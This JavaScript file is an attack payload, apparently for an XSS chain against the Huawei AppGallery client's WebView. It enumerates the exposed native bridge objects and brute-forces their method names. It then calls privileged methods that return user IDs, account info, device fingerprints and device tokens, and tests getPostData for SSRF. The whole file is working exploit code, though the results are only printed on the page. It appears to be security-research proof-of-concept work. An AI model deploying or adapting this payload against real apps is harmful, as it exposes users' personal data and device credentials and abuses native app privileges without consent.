(function () {
  'use strict';
  var log = [];
  var resultDiv = document.getElementById('result');
  function appendLog(title, content) {
    var entry = document.createElement('div');
    entry.style.cssText = 'border:1px solid #ccc;margin:5px 0;padding:8px;border-radius:4px;background:#f9f9f9;font-size:12px;word-break:break-all;';
    var titleEl = document.createElement('b');
    titleEl.textContent = title;
    titleEl.style.color = '#d32f2f';
    var contentEl = document.createElement('pre');
    contentEl.textContent = content;
    contentEl.style.cssText = 'white-space:pre-wrap;margin:4px 0 0 0;font-size:11px;';
    entry.appendChild(titleEl);
    entry.appendChild(contentEl);
    if (resultDiv) {
      resultDiv.appendChild(entry);
    }
    log.push({ title: title, content: content });
  }
  function safeCall(fn) {
    try { return fn(); }
    catch (e) { return 'ERROR: ' + e.message; }
  }
  /* ============================================================
   * Phase 1: Enumerate window for JSProxy objects
   * ============================================================ */
  function enumerateWindow() {
    appendLog('=== Phase 1: Window Enumeration ===', '');
    var knownAbsJsProxyMethods = [
      'toDetailPage', 'getCurrentUserInfo', 'isDarkModel', 'clickToBI',
      'sharePoster', 'getHiSpaceVersion', 'getUserId', 'checkLogin',
      'loginForward', 'getClientParams', 'getPostData'
    ];
    var knownBridgeMethods = ['invoke', 'invokeSync'];
    var found = [];
    for (var key in window) {
      try {
        var val = window[key];
        if (val && typeof val === 'object') {
          var methods = [];
          var proto = Object.getPrototypeOf(val);
          var allKeys = Object.getOwnPropertyNames(val);
          if (proto) {
            allKeys = allKeys.concat(Object.getOwnPropertyNames(proto));
          }
          for (var i = 0; i < allKeys.length; i++) {
            var prop = allKeys[i];
            try {
              if (typeof val[prop] === 'function') {
                methods.push(prop);
              }
            } catch (e) {}
          }
          if (methods.length > 0) {
            var isAbsJsProxy = knownAbsJsProxyMethods.some(function (m) { return methods.indexOf(m) >= 0; });
            var isBridge = knownBridgeMethods.every(function (m) { return methods.indexOf(m) >= 0; });
            if (isAbsJsProxy || isBridge || methods.length > 2) {
              found.push({ name: key, methods: methods, isAbsJsProxy: isAbsJsProxy, isBridge: isBridge });
            }
          }
        }
      } catch (e) {}
    }
    var summary = found.map(function (f) {
      var type = f.isAbsJsProxy ? '[AbsJsProxy]' : (f.isBridge ? '[JsBridge]' : '[Unknown]');
      return type + ' window.' + f.name + ' => methods: ' + f.methods.join(', ');
    }).join('\n');
    appendLog('Found ' + found.length + ' candidate objects', summary || 'None found');
    return found;
  }
  /* ============================================================
   * Phase 2: Call AbsJsProxy (AnnualReportWebViewInterface) methods
   * ============================================================ */
  function callAbsJsProxyMethods(proxyObj) {
    appendLog('=== Phase 2: AbsJsProxy Methods ===', 'Object: ' + proxyObj._name);
    /* 2.1 getHiSpaceVersion - sync, no args */
    appendLog('[2.1] getHiSpaceVersion()', safeCall(function () {
      var r = proxyObj.getHiSpaceVersion();
      return 'Result: ' + r;
    }));
    /* 2.2 isDarkModel - sync, no args */
    appendLog('[2.2] isDarkModel()', safeCall(function () {
      var r = proxyObj.isDarkModel();
      return 'Result: ' + r;
    }));
    /* 2.3 checkLogin - sync, no args */
    appendLog('[2.3] checkLogin()', safeCall(function () {
      var r = proxyObj.checkLogin();
      return 'Result: ' + r;
    }));
    /* 2.4 getUserId - sync, no args - PII */
    appendLog('[2.4] getUserId()', safeCall(function () {
      var r = proxyObj.getUserId();
      return 'Result: ' + r;
    }));
    /* 2.5 getCurrentUserInfo - sync, no args - PII */
    appendLog('[2.5] getCurrentUserInfo()', safeCall(function () {
      var r = proxyObj.getCurrentUserInfo();
      return 'Result: ' + r;
    }));
    /* 2.6 getClientParams - sync, no args - Device fingerprint */
    appendLog('[2.6] getClientParams()', safeCall(function () {
      var r = proxyObj.getClientParams();
      return 'Result: ' + r;
    }));
    /* 2.7 toDetailPage - sync, 1 arg */
    appendLog('[2.7] toDetailPage("test")', safeCall(function () {
      proxyObj.toDetailPage(JSON.stringify({ appDetailId: 'C5765880207854074875' }));
      return 'Called (navigation triggered)';
    }));
    /* 2.8 clickToBI - sync, 2 args */
    appendLog('[2.8] clickToBI("test_event", "{}")', safeCall(function () {
      proxyObj.clickToBI('test_event', JSON.stringify({ key: 'value' }));
      return 'Called (BI report sent)';
    }));
    /* 2.9 getPostData - async via callback, SSRF test */
    appendLog('[2.9] getPostData(url, params, callback, "JSON")', safeCall(function () {
      window.__ag_callback = function (res) {
        appendLog('[2.9 callback] getPostData response', res);
      };
      proxyObj.getPostData(
        'https://appgallery.huawei.com/api/test',
        JSON.stringify({ key: 'value' }),
        '__ag_callback',
        'JSON'
      );
      return 'Called (async, check callback)';
    }));
    /* 2.10 loginForward - opens new WebView (UXSS chain) */
    appendLog('[2.10] loginForward(url) - SKIPPED (triggers navigation)', 'Would call: loginForward("https://appgallery.huawei.com/campaign/test")');
    /* 2.11 sharePoster - async with callbacks */
    appendLog('[2.11] sharePoster(data, success, fail)', safeCall(function () {
      window.__ag_share_success = function () { appendLog('[2.11 success] sharePoster', 'Share succeeded'); };
      window.__ag_share_fail = function () { appendLog('[2.11 fail] sharePoster', 'Share failed'); };
      proxyObj.sharePoster(
        JSON.stringify({ title: 'test', url: 'https://example.com' }),
        '__ag_share_success',
        '__ag_share_fail'
      );
      return 'Called (async)';
    }));
  }
  /* ============================================================
   * Phase 3: Campaign JsBridge (invoke/invokeSync)
   * ============================================================ */
  function callCampaignBridge(bridgeObj) {
    appendLog('=== Phase 3: Campaign JsBridge ===', 'Object: ' + bridgeObj._name);
    var services = ['app', 'account', 'content', 'member', 'redirect', 'application', 'live'];
    /* 3.1 invokeSync - app.getParams */
    appendLog('[3.1] invokeSync("app", "getParams", "")', safeCall(function () {
      var r = bridgeObj.invokeSync('app', 'getParams', '');
      return 'Result: ' + r;
    }));
    /* 3.2 invokeSync - app.getDeviceSessionId */
    appendLog('[3.2] invokeSync("app", "getDeviceSessionId", "")', safeCall(function () {
      var r = bridgeObj.invokeSync('app', 'getDeviceSessionId', '');
      return 'Result: ' + r;
    }));
    /* 3.3 invokeSync - app.getDeviceToken */
    appendLog('[3.3] invokeSync("app", "getDeviceToken", "")', safeCall(function () {
      var r = bridgeObj.invokeSync('app', 'getDeviceToken', '');
      return 'Result: ' + r;
    }));
    /* 3.4 invoke - app.reportEvent (async) */
    appendLog('[3.4] invoke("app", "reportEvent", ...)', safeCall(function () {
      window.__ag_bridge_cb_1 = function (res) {
        appendLog('[3.4 callback] reportEvent', res);
      };
      var r = bridgeObj.invoke('app', 'reportEvent', JSON.stringify({ eventId: 'test' }), '__ag_bridge_cb_1', '');
      return 'Invoke returned: ' + r;
    }));
    /* 3.5 invokeSync - account (showShipAddress is async, skip sync) */
    appendLog('[3.5] invokeSync("account", "", "")', safeCall(function () {
      var r = bridgeObj.invokeSync('account', '', '');
      return 'Result: ' + r;
    }));
    /* 3.6 invoke - content.share (async) */
    appendLog('[3.6] invoke("content", "share", ...)', safeCall(function () {
      window.__ag_bridge_cb_2 = function (res) {
        appendLog('[3.6 callback] content.share', res);
      };
      var r = bridgeObj.invoke('content', 'share', JSON.stringify({ title: 'test' }), '__ag_bridge_cb_2', '');
      return 'Invoke returned: ' + r;
    }));
    /* 3.7 invoke - content.downloadShareImage (async) */
    appendLog('[3.7] invoke("content", "downloadShareImage", ...)', safeCall(function () {
      window.__ag_bridge_cb_3 = function (res) {
        appendLog('[3.7 callback] downloadShareImage', res);
      };
      var r = bridgeObj.invoke('content', 'downloadShareImage', JSON.stringify({ url: 'https://example.com/img.png' }), '__ag_bridge_cb_3', '');
      return 'Invoke returned: ' + r;
    }));
    /* 3.8 invoke - app.showToast */
    appendLog('[3.8] invokeSync("app", "showToast", ...)', safeCall(function () {
      var r = bridgeObj.invokeSync('app', 'showToast', JSON.stringify({ message: 'XSS Test' }));
      return 'Result: ' + r;
    }));
    /* 3.9 invoke - app.createCalendarEvent */
    appendLog('[3.9] invoke("app", "createCalendarEvent", ...)', safeCall(function () {
      window.__ag_bridge_cb_4 = function (res) {
        appendLog('[3.9 callback] createCalendarEvent', res);
      };
      var r = bridgeObj.invoke('app', 'createCalendarEvent', JSON.stringify({ title: 'test', time: Date.now() }), '__ag_bridge_cb_4', '');
      return 'Invoke returned: ' + r;
    }));
  }
  /* ============================================================
   * Phase 4: Brute-force try known method names on all window objects
   * ============================================================ */
  function bruteForceMethods() {
    appendLog('=== Phase 4: Brute-force Method Discovery ===', '');
    var methodsToFind = [
      'getHiSpaceVersion', 'getUserId', 'checkLogin', 'getCurrentUserInfo',
      'getClientParams', 'isDarkModel', 'clickToBI', 'toDetailPage',
      'getPostData', 'loginForward', 'sharePoster',
      'invoke', 'invokeSync'
    ];
    for (var key in window) {
      try {
        var val = window[key];
        if (!val || typeof val !== 'object') continue;
        for (var i = 0; i < methodsToFind.length; i++) {
          var m = methodsToFind[i];
          try {
            if (typeof val[m] === 'function') {
              appendLog('FOUND: window.' + key + '.' + m + '()', 'Type: ' + typeof val[m]);
            }
          } catch (e) {}
        }
      } catch (e) {}
    }
  }
  /* ============================================================
   * Main
   * ============================================================ */
  function main() {
    appendLog('AGclient XSS Chain - JS Interface Enumeration', 'URL: ' + window.location.href + '\nUA: ' + navigator.userAgent);
    /* Phase 1: Enumerate */
    var found = enumerateWindow();
    /* Phase 4: Brute-force (always run) */
    bruteForceMethods();
    /* Phase 2: Call AbsJsProxy methods */
    var absProxy = null;
    var bridge = null;
    for (var i = 0; i < found.length; i++) {
      if (found[i].isAbsJsProxy) {
        absProxy = window[found[i].name];
        absProxy._name = found[i].name;
      }
      if (found[i].isBridge) {
        bridge = window[found[i].name];
        bridge._name = found[i].name;
      }
    }
    /* If not found by enumeration, try common names */
    if (!absProxy) {
      var commonNames = ['hiSpace', 'HiSpace', 'annualReport', 'AnnualReport', 'jsObject',
        'webInterface', 'webview', 'webView', 'agJsProxy', 'appGallery',
        'hiSpaceProxy', 'annualReportWebViewInterface', '__jsProxy'];
      for (var j = 0; j < commonNames.length; j++) {
        try {
          if (window[commonNames[j]] && typeof window[commonNames[j]].getUserId === 'function') {
            absProxy = window[commonNames[j]];
            absProxy._name = commonNames[j];
            appendLog('AbsJsProxy found by common name', 'window.' + commonNames[j]);
            break;
          }
          if (window[commonNames[j]] && typeof window[commonNames[j]].getHiSpaceVersion === 'function') {
            absProxy = window[commonNames[j]];
            absProxy._name = commonNames[j];
            appendLog('AbsJsProxy found by common name', 'window.' + commonNames[j]);
            break;
          }
        } catch (e) {}
      }
    }
    if (!bridge) {
      var bridgeNames = ['campaign', 'Campaign', 'campaignBridge', 'jsBridge', 'JsBridge',
        'wiseBridge', 'wiseOperation', 'hmfBridge', '__jsBridge'];
      for (var k = 0; k < bridgeNames.length; k++) {
        try {
          if (window[bridgeNames[k]] && typeof window[bridgeNames[k]].invoke === 'function') {
            bridge = window[bridgeNames[k]];
            bridge._name = bridgeNames[k];
            appendLog('JsBridge found by common name', 'window.' + bridgeNames[k]);
            break;
          }
        } catch (e) {}
      }
    }
    if (absProxy) {
      callAbsJsProxyMethods(absProxy);
    } else {
      appendLog('AbsJsProxy NOT FOUND', 'Domain may be NOINLIST - JSProxy not registered.\nCheck getWebViewType() return value in hilog.');
    }
    if (bridge) {
      callCampaignBridge(bridge);
    } else {
      appendLog('Campaign JsBridge NOT FOUND', 'Campaign SDK bridge may not be registered for this URL.\nPolicy only allows appgallery.huawei.com/campaign');
    }
    appendLog('=== Enumeration Complete ===', 'Total log entries: ' + log.length + '\nReview results above.');
  }
  /* Run with slight delay to ensure DOM is ready */
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', main);
  } else {
    setTimeout(main, 100);
  }
})();
